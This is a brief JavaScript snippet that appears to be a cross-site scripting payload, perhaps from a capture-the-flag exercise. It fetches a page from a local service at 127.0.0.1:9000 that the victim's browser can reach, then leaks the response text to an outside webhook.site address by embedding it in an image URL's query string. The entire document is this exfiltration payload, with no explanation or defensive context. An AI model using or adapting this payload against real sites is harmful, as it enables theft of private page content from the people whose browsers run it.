
fetch("http://127.0.0.1:9000/view/f09d4c45-4212-4008-bdcd-9376c8ec813a").then((res) => {
	return res.text();
}).then(data => {
	var img = document.createElement("img");
	img.src="https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data;
	document.body.appendChild(img);
})
